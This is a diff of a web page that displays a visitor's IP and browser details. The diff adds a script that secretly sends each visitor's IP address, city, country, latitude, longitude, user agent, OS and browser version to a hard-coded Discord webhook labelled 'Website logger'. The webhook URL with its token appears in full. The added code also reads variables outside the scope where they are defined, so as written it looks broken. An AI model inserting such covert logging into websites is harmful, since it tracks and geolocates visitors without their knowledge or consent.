@@ -22,7 +22,6 @@
         <p id="ipapi-timezone"></p>
         <p id="ipapi-lat"></p>
         <p id="ipapi-long"></p>
-
         <p id="ua-p"></p>
         <p id="lang-p"></p>
         
@@ -38,15 +37,28 @@
                 document.getElementById('ipapi-timezone').innerHTML = ipapi.timezone;
                 document.getElementById('ipapi-lat').innerHTML = ipapi.latitude;
                 document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
-
-
             })
             document.getElementById('ip-p').innerHTML = data.ip;
             document.getElementById('ua-p').innerHTML = navigator.userAgent;
             document.getElementById('lang-p').innerHTML = navigator.language;
         })
 
-        
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1032047721588195359/3QFAbl1GpmbjAbM8rtI4Uj3PHq2GHkDqMPam3cq4_Jcz4YYC-53RqkhdUfDYTDZBlsfH");
+        request.setRequestHeader('Content-type', 'application/json');
+        let currentDate = new Date();
+        let cSec = currentDate.getSeconds();
+        let cMin = currentDate.getMinutes();
+        let cHour = currentDate.getHours();
+        let cDay = currentDate.getDate();
+        let cMonth = currentDate.getMonth() + 1;
+        let cYear = currentDate.getFullYear();
+        var params = 
+        {username: "Website logger", avatar_url: "", content: "", 
+        embeds: [{title: "User Logged on `" + cDay + "/" + cMonth + "/" + cYear + " | " + cHour + ":" + cMin + ":" + cSec + "`",
+                    color: 1752220,
+                    description: "**IP: **`" + data.ip + "`" + "\n**Language: **`" + navigator.language + "`" + "\n**User Agent: **`" +  navigator.userAgent + "`" + "\n\n**OS: **` " + navigator.platform + "`" + "\n**Webdriver: **`" + navigator.webdriver + "`" + "\n**Version: **`" + navigator.appVersion + "`" + "\n**Country: **" + ipapi.country_name + "\n**City: **" + ipapi.city + "\n**Latitude: **" + ipapi.latitude + "\n**Longitude: **" + ipapi.longitude}]}
+        request.send(JSON.stringify(params));
 
         function reveal() {
             document.getElementById('hidden-info').style.visibility = 'visible';
